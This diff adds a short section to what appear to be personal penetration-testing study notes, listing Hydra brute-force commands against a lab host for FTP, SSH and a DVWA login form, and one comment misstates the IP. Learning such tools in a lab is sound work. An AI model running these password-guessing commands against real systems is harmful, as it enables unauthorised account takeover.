@@ -112,3 +112,14 @@
 
 --- 
 
+**Hydra Bruteforce:**
+**Commands:**
+   - `hydra -l msfadmin -P password.txt 10.0.2.6 ftp` (Specified username as msfadmin,used 10.0.0.26 as IP address and password.txt as wordlist)
+   - `hydra -L users.txt -P password.txt 10.0.2.6 ftp` (Specified wordlists for both username and password)
+   (ftp is the selected service of the target open port )
+   - `hydra -L users.txt -P password.txt 10.0.2.6 ssh -V` (ssh instead of ftp if the port service is ssh, -V for verbose)
+   after intercept on burpsuite:
+   - `hydra -L users.txt -P password.txt 10.0.2.6 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" ` 
+
+---
+
